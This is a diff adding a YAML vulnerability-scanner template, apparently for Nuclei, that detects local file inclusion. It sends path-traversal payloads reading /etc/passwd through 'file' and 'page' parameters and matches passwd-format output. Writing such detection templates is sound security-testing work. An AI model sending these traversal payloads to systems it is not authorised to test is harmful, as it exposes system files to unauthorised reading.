@@ -1,0 +1,20 @@
+id: lfi-detection
+
+info:
+  name: Local File Inclusion (LFI)
+  author: AI-Assistant
+  severity: critical
+  description: Detects path traversal and local file inclusion attempts (e.g., reading /etc/passwd). Maps to OWASP Top 10 A01:2021-Broken Access Control.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/?page=../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/index.php?page=../../../../../../../../etc/passwd"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
